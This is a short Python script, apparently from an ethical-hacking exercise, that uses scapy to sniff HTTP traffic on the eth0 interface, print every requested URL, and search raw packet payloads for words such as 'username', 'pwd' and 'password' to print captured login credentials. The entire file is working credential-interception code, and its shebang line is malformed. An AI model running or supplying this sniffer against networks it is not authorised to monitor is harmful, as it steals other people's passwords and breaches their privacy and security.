#!/usr/bin  python3

import scapy.all as scapy
from scapy.layers import http


def get_url(packet, protocol):
    if packet.haslayer(protocol):
        return f'[+] HTTP Request >> {packet[protocol].Host}{packet[protocol].Path}'


def get_login_info(packet, layers, filter_words):
    for layer in layers:
        if not packet.haslayer(layer):
            break
    else:
        load = str(packet[layer].load)
        for filter_word in filter_words:
            if filter_word in load:
                return f"\n\n[+] Possible username/password > {load}\n\n"


def sniff(interface, layers, filter_words):

    def process_sniffed_packet(packet):
        nonlocal layers
        nonlocal filter_words
        protocol = layers[0]

        url = get_url(packet, protocol)

        if url:
            print(url)

        login_info = get_login_info(packet, layers, filter_words)

        if login_info:
            print(login_info)

    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


if __name__ == '__main__':
    sniff("eth0", tuple((http.HTTPRequest, scapy.Raw)),
          tuple(("uname", "username", 'usr', 'pwd', 'pass', 'password')))
